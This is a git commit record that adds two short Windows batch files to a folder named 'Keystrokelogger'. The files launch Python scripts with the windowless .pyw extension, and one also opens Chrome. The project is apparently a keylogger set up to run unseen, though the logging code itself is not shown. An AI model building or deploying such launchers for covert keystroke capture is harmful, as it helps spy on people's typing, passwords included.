518bd5e5b3a5fb6f3f565a0ab34706821976ba93
AkshayGalgali <60934796+Akshay-Galgali@users.noreply.github.com>
2023-02-14 14:27:23 -0500

    Add files via upload

---
+++ Keystrokelogger/keyandreader.bat
@@ -0,0 +1,4 @@
+@echo off
+start "" "C:\Users\Akshay Galgali\reader.pyw"  
+start "" "C:\Users\Akshay Galgali\fulltry.pyw" 
+ 
---
+++ Keystrokelogger/start.bat
@@ -0,0 +1,3 @@
+@echo off
+start "" "C:\Users\Akshay Galgali\full.pyw" 
+start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
